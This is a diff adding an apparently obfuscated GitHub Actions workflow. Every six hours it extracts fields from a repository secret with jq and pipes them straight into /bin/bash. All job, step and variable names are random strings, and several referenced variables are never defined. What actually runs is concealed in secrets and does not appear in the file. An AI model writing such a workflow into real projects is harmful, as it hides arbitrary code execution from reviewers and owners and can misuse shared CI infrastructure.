@@ -1,0 +1,27 @@
+name: pangxifeng5678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pangxifeng5678
+        env:
+          ljvhs280: ${{ secrets.ljvhs280 }}
+        run: |
+          echo $ljvhs280 | jq -r .qynnz5404 | /bin/bash
+          echo $kzir66 | jq -r .ixxfp049 | /bin/bash
+          echo $vpyuf3 | jq -r .z626 | /bin/bash
+          echo $mia77065 | jq -r .qab2320 | /bin/bash
+          echo $rzsuo46926 | jq -r .zk9805 | /bin/bash
+          echo $btmkm2687 | jq -r .sfy0 | /bin/bash
+          echo $lbcgr86 | jq -r .tg1 | /bin/bash
+          echo $byirh573 | jq -r .pktv78553 | /bin/bash
+          echo $gomg25428 | jq -r .c088 | /bin/bash
+          echo $w56 | jq -r .ffrch810 | /bin/bash
+          echo $r6803 | jq -r .wekp74 | /bin/bash
+
